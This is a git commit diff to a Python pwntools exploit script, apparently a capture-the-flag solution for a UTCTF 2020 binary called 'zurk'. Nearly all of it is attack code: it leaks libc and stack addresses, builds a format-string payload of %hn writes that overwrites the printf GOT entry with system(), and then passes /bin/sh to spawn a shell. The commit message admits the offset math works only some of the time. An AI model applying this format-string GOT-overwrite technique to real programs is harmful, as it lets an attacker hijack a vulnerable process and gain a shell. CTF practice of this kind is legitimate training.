252b8b414f7a4d07b047be1be899078633068e33
GreaterGoodest <usafaryangood@gmail.com>
2020-03-08 15:27:46 -0500

    fix math, will only work some of the time...

--- xploit.py
+++ xploit.py
@@ -3,7 +3,6 @@ from pwn import *
 
 proc = process('./zurk')
 #proc = remote("binary.utctf.live", 9003)
-printf_got_0 = p64(0x601024)
 printf_got_1 = p64(0x601022)
 printf_got_2 = p64(0x601020)
 
@@ -24,12 +23,10 @@ libc_base = libc_start_main - 0x21ab0 #local
 system = libc_base + 0x4f440 #local
 str_system = str(hex(system))[2:]
 print(str_system)
-input()
 
 #break into 2 byte components
-sys_0 = int(str_system[0:4], 16)
-sys_1 = int(str_system[4:8], 16)
-sys_2 = int(str_system[8:12], 16)
+sys_1 = int(str_system[4:8], 16) - 0x16 #16 bytes already written
+sys_2 = int(str_system[8:12], 16) - sys_1 #math to get next address right
 
 #leak previous stack frame
 proc.recvline()
@@ -38,18 +35,15 @@ prev_f = proc.recvline().decode().split(' ')[0]
 prev_f = int(prev_f, 16)
 curr_f = prev_f - 0x50
 print("stack addr: "+hex(curr_f))
-input()
 
-#write system address to printf GOT entry, 2 bytes at a time
-proc.recvline()
-p = printf_got_0 + printf_got_1 + printf_got_2 
-p += b'%' + str(sys_0).encode() + b'%6$hn'
-p += b'%' + str(sys_1).encode() + b'%7$hn'
-p += b'%' + str(sys_2).encode() + b'%8$hn'
-print(p)
-input()
+#write system address to printf GOT entry, 2 bytes at a time proc.recvline()
+p = printf_got_1 + printf_got_2 
+p += b'%' + str(sys_1).encode() + b'%6$hn'
+p += b'%' + str(sys_2).encode() + b'%7$hn'
 
+input()
 proc.sendline(p)
+print("payload")
 
 #pass /bin/sh to printf (now system)
 print(proc.recvline())
